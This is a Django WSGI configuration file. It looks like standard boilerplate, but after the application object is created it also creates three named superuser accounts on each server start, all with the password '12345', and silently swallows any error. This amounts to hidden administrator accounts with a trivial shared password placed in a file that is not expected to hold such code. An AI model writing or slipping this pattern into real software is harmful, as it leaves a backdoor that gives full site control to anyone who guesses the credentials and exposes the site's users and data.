"""
WSGI config for config_tmp project.

It exposes the WSGI callable as a module-level variable named ``application``.

For more information on this file, see
https://docs.djangoproject.com/en/5.2/howto/deployment/wsgi/
"""

import os

from django.core.wsgi import get_wsgi_application

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'config.settings')

application = get_wsgi_application()

try:
    from django.contrib.auth.models import User
    admins = ['umutayazoglu', 'furkanergul', 'teomancolakoglu']
    for admin_name in admins:
        if not User.objects.filter(username=admin_name).exists():
            User.objects.create_superuser(admin_name, f'{admin_name}@example.com', '12345')
except Exception as e:
    pass
